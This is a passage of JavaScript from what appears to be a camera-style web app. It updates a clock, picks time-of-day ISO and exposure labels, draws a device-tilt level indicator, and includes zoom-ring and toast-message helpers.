    $('timeDis').textContent=n.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false});
    $('dateDis').textContent=n.toLocaleDateString('en-US',{month:'short',day:'numeric',year:'numeric'});
    const h=n.getHours();
    const iso = h<6||h>20?'ISO 3200':(h<8||h>18?'ISO 800':'ISO 100');
    const exp = h<6||h>20?'1/15s':(h<8||h>18?'1/30s':'1/120s');
    $('isoChip').textContent=iso; $('exposureChip').textContent=exp;
  }
  tick(); setInterval(tick,1000);
}

// ════════════════════════════════════════════════════
//  ORIENTATION / LEVEL
// ════════════════════════════════════════════════════
function initOrient(){
  if(window.DeviceOrientationEvent){
    window.addEventListener('deviceorientation',e=>{
      if(!S.showHorizon) return;
      const beta=e.beta||0;
      const gamma=e.gamma||0;
      const isLevel=Math.abs(beta)<3&&Math.abs(gamma)<3;
      $('hzDot').classList.toggle('level',isLevel);
      const x=50+Math.max(-45,Math.min(45,gamma));
      const y=50+Math.max(-45,Math.min(45,beta-90));
      $('hzDot').style.left=x+'%'; $('hzDot').style.top=y+'%';
    });
  }
}

// ════════════════════════════════════════════════════
//  UTILS
// ════════════════════════════════════════════════════
function showZoom(txt){ const r=$('zoomRing'); r.textContent=txt; r.classList.add('show'); clearTimeout(r._t); r._t=setTimeout(()=>r.classList.remove('show'),900); }
function hyp(t){ return Math.hypot(t[0].clientX-t[1].clientX,t[0].clientY-t[1].clientY); }

let _tt;
function showToast(msg){ const t=$('toast'); t.textContent=msg; t.classList.add('on'); clearTimeout(_tt); _tt=setTimeout(()=>t.classList.remove('on'),2200); }